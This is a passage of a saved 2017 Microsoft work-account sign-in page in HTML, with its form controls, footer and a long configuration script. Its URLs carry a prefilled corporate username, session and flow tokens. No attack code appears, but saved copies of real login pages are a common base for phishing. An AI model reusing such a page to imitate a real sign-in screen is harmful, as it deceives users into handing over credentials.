  <input name="canary" value="OKh46jPW0dgljHO5riuO2u+Rjw1qmwMmR6rmboe+EeE=1:1" type="hidden"> 
  <input name="dssoToken" id="dssoToken" type="hidden"> 
</div>



    </li>

    <li id="login-splitter-control" class="login_splitter_control">
        <div id="splitter-tiles-container"></div>
    </li>
    <li class="login_cred_options_container" id="login_cred_options_container" role="main">


        

<div id="cred_kmsi_container" class="subtext normaltext">
    <span class="input_field ">
        <input id="cred_keep_me_signed_in_checkbox" value="0" class="win-checkbox" name="persist" type="checkbox">
        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
    </span>
</div>

        
        <input type="submit" value="Sign in" tabindex="11"
          class="button normaltext cred_sign_in_button refresh_domain_state control-button button-two button_primary" >


        <button id="cred_cancel_button" class="button normaltext cred_cancel_button control-button button-one no_display" aria-hidden="true">
            Back
        </button>

        

        <div id="recover_container" class="subtext smalltext">
            <span>
                <a id="cred_forgot_password_link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+8.1&amp;username=accounting%40fbc.ca">Can't access your account?</a>
            </span>
        </div>

        


        <div id="guest_hint_text" class="guest_direction_hint smalltext no_display" aria-hidden="true" style="display: none;">Don't have an account assigned by your work or school?</div>
        <div class="guest_redirect_container no_display" aria-hidden="true" style="display: none;">
            <span class="guest_redirect smalltext">
                <span>
                    <a id="guest_redirect_link" tabindex="20" href="https://login.live.com/login.srf?wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0&amp;id=&amp;cbcxt=out&amp;uaid=05781673e3a04cc98fc16345dd3ce2ac&amp;pcexp=false&amp;username=accounting%40fbc.ca&amp;popupui=">Sign in with a Microsoft account</a>
                </span>
            </span>
        </div>
		</form>
    </li>
        
    <li id="disambig-container" class="smalltext marginTop30px" style="display: none;">
        <div id="disambig-help-container">
            
            Tired of seeing this? <a href="#" id="iDisambigRenameLink">Rename your personal Microsoft account.</a>
        </div>
    </li>

        <!-- From ViewTemplateBase/Tiles.cshtml -->
        <div id="switch_user_container" class="subtext smalltext" style="display: none;">
            <span id="switch_user_text">
                <a id="switch_user_link" href="https://login.microsoftonline.com/common/reprocess?prompt=select_account&amp;sosid=&amp;ctx=rQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0">
                    Sign out and sign in with a different account
                </a>
            </span>
        </div>
        <!--  -->

<input id="home_realm_discovery" value="2" type="hidden"></ul>


<div id="samlrequest_container" class="no_display" aria-hidden="true">
    <form id="samlform" method="post" action="/common/login">
        <input id="samlrelaystate" name="RelayState" type="hidden">
        <input id="samlrequest" name="SAMLRequest" type="hidden">
        <input name="canary_1" value="OKh46jPW0dgljHO5riuO2u+Rjw1qmwMmR6rmboe+EeE=1:1" type="hidden"> 
    </form>
</div>







                            </div>
                            <div class="push">
                            </div>
                        </div>


<div id="footer_links_container" class="login_footer_container" role="contentinfo">
    <div class="footer_inner_container">
        <div id="footer_table" class="footer_block">
                <div class="corporate_footer">
                        <div>
                            <span class="footer_link text-caption" id="footer_copyright_link">
� 2017 Microsoft                            </span>
                        </div>
                        <div>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_terms" href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
                            </span>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_privacy" href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy &amp; Cookies</a>
                            </span>
                        </div>
                </div>
                    <div class="footer_glyph">
                        <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/images/microsoft_logo.png" alt="Microsoft account symbol">
                    </div>
        </div>
    </div>
</div>
<div id="login_prefetch_container" class="no-display">
<iframe src="https://outlook.office365.com/owa/prefetch.aspx" seamless="seamless" scrolling="no" id="login_prefetch_iframe"></iframe></div>
                    </td>
                </tr>
            </tbody></table>
        </div>
        


<script type="text/javascript">
    var Constants = Constants || {};
    Constants.MEMBER_NAME = "";

    
    Constants.REDIRECT_MESSAGES = {
        'AAD': "We\u0027re taking you to your organization\u0027s sign-in page.",
        'MSA': "We�re taking you to the Microsoft account sign-in page.",
        'CLOUDFEDERATED': "We\u0027re taking you to your organization\u0027s sign-in page."
    };

    Constants.FEDERATION_QUERY_PARAMETERS = '?client-request-id=05781673-e3a0-4cc9-8fc1-6345dd3ce2ac&username=accounting%40fbc.ca&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0'.substr(1);
    Constants.CONTEXT = 'rQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0';
    Constants.BASE_URL = '/common/reprocess?';
    Constants.LATENCY_THRESHOLD = 2000;

    Constants.CDN_IMAGE_PATH = 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/images/';
    Constants.PREFETCH_URL = "https://outlook.office365.com/owa/prefetch.aspx";
    Constants.IS_USE_OTHER_ACCOUNT_VISIBLE = true;
    Constants.OTHER_ACCOUNT_TEXT = "Use another account";
    Constants.MAX_USER_TILES = 5;

    Constants.PARTNER_NAME = "Work or school account";
    Constants.DIR = 'ltr';
    Constants.METRICS_MODE = 1;  // Client metrics mode.

    if (Constants.TokenizedStringMsgs) {
        
        Constants.TokenizedStringMsgs.GENERIC_ERROR = "\u003cH1\u003eSorry, but we\u0027re having trouble signing you in\u003c/H1\u003e\u003cp\u003ePlease try again in a few minutes. If this doesn\u0027t work, you might want to contact your admin and report the following error: #~#ErrorCode#~#.\u003c/p\u003e";
        Constants.TokenizedStringMsgs.UPN_DISAMBIGUATE_MESSAGE = "It looks like {0} is used with more than one account. Which account do you want to use?";
    }

    
    Constants.FLOW_TOKEN = '';
    Constants.FLOW_TOKEN_COOKIE_NAME = 'ESTSWCTXFLOWTOKEN';
    Constants.LCID = "1033";
    Constants.MSA_ACCOUNT_IMG_ALT_TEXT = "Microsoft account symbol";
    Constants.AAD_ACCOUNT_IMG_ALT_TEXT = "Work or school account symbol";
    Constants.MSA_ACCOUNT_TILE_ALT_TEXT = "Microsoft account for {0}";
    Constants.AAD_ACCOUNT_TILE_ALT_TEXT = "Work or school account for {0}";
        Constants.REALM_RESOLVER_URL = "/common/userrealm";
    Constants.FORCED_SIGN_IN = false;
    Constants.MSA_AUTH_URL = 'https://login.live.com/login.srf?wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0&id=&cbcxt=out&uaid=05781673e3a04cc98fc16345dd3ce2ac';
    Constants.IS_CXH_REQUEST = false;
    Constants.IS_ADAL_REQUEST = false;
    Constants.IS_NAME_COEXISTENCE_ACCOUNT = false;
    Constants.ADAL_UX_OVERRIDE = false;
    Constants.CANCEL_REDIRECT_URL = 'https://outlook.office365.com/owa/?realm=fbc.ca&exsvurl=1&ll-cc=1033&modurl=0&error=access_denied&error_subcode=cancel';
    Constants.IS_MSA_FED_SUPPORTED = false;
    Constants.IS_MSA_PHONE_USERNAME_SUPPORTED = false;
    Constants.IS_MSA_REDIR_SUPPORTED = false;
    Constants.MSA_DOMAIN = 'live.com';
    Constants.PROMPT = '';
    Constants.CLICKFORMORE = "Click for more actions";
    Constants.CONNECTEDTOWINDOWS = "Connected to Windows";
    Constants.SIGNEDIN = "Signed in";
    Constants.CLICKTOSIGNIN = "";
    Constants.SIGNINGOUT = "Signing out...";
    Constants.USERNAME_HINT_TEXT = 'someone@example.com ';
    Constants.IS_LOGOUT_REQUEST = false;
    Constants.SHOULD_HIDE_SIGNUP = false;
    Constants.USE_DARK_TILE_LOGO = false;
    Constants.HAS_ERROR = true;
    Constants.IS_MOBILE = false;
    Constants.uxLogoutUrl = "https://login.microsoftonline.com/common/uxlogout";
    Constants.forgetUrl = "https://login.microsoftonline.com/forgetuser";
    Constants.IS_HOLOGRAPHIC = false;
    Constants.Header_Text_Username = 'Sign in with your work account';
    Constants.Header_Text_Password = 'Enter your password';
    Constants.Header_Text_Privacy = 'Privacy statement';
    Constants.Use_Client_Check_Msa_Flag = true;
    Constants.DisambigHelpUrl = "https://go.microsoft.com/fwlink/p/?LinkID=733247";
    Constants.CxhFlow = "";
    Constants.isChinaDC = false;
    Constants.Locale = "en-US";
    Constants.IsB2CScenario = false;
    Constants.appRedirectUrl = 'https://login.live.com/login.srf?wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0&id=&cbcxt=out&uaid=05781673e3a04cc98fc16345dd3ce2ac';
    Constants.msaSignupUrl = 'https://signup.live.com/signup?id=12&uiflavor=web&lw=1&fl=easi2&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0&cbcxt=out&uaid=05781673e3a04cc98fc16345dd3ce2ac';
    Constants.footerTermsUrl = 'https://www.microsoft.com/en-US/servicesagreement/';
    Constants.footerPrivacyUrl = 'https://privacy.microsoft.com/en-US/privacystatement';

    Constants.SplitterControlData = [
    {
        "name": "Work or school account",
        "login": "Created by your IT department",
        "image": "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/images/work_account.png",
        "link": 'MSLogin.SplitterControl.LoginAAD',
        "authUrl": '',
        "id": 'aad_account_tile',
        "domainHint": ''
    }, {
        "name": "Personal account",
        "login": "Created by you",
        "image": "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/images/personal_account.png",
        "link": 'MSLogin.SplitterControl.LoginMSA',
        "authUrl": 'https://login.live.com/login.srf?wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0&id=&cbcxt=out&uaid=05781673e3a04cc98fc16345dd3ce2ac',
        "id": 'mso_account_tile',
        "domainHint": 'msa'
    }];

    
    Constants.responseMode="NotSpecified";
    
    
    

        Constants.desktopSsoConfig =
          {
                        iwaEndpointUrlFormat: "https://autologon.microsoftazuread-sso.com/{0}/winauth/sso?desktopsso=true&isAdalRequest=False",
                        iwaRequestTimeoutInMs: -2147483648,
                        lastUsernameTried: ""
              };

    Constants.onPremPasswordValidationConfig =
    {
        isPollingRequired: false,
        pollUrl: '/common/onpremvalidation/Poll',
        maxPolls: 20,
        maxPollsOnError: 3,
        pollingInterval: 500,
        timeout: 7 * 1000,
        flowToken: 'AQABAAEAAABnfiG-mA6NTae7CdWW7QfdsnMxxwq5dPvcAeM65a_ruqSjxX2kkDHhbKWrQ9Zr3yDnk6p2-r9n7NAGO4_5kwj5XeDkPTKzllA9vmZJHwSx-iRCBk-eIqpxfYqHRQu5ZunMQxg2i7Zpr3_CGNUDPeMg_1SFkin3uhyFqHCnNg5TbCIsTQcYX9KkIeyOaDfYTXhrnS9uOaQ2Okh6kMbg6rUmsd5b7PczQYmG9bDBgGnhBlC-TJmsu1LKq3xyxp9lrAtx8LGpFbfTVC9XYv58QMAJf6foN2XmXFj4bgY2U1L_0pCZEPLn0KgX2oCnftlcleEgAA'
    }

    

    if (typeof User !== "undefined") {
        // Setup cta message fields.
        User.setupCallToActionMessages();
    }

    // Other tile
    var Tiles = Tiles || {};
    Tiles.otherJSON = {
        'name': 'Use another account',
        'login': '',
        'imageAAD': 'other_glyph.png',
        'imageMSA': 'other_glyph.png',
        'isLive': false,
        'link': 'other',
        'authUrl': '',
        'sessionID': '',
        'domainHint': 'other'
    };
</script>




    


<!-- Pull suppressed as UseAgent did not meet required criteria -->

    


<!-- Pull suppressed as UseAgent did not meet required criteria -->

    

</body></html>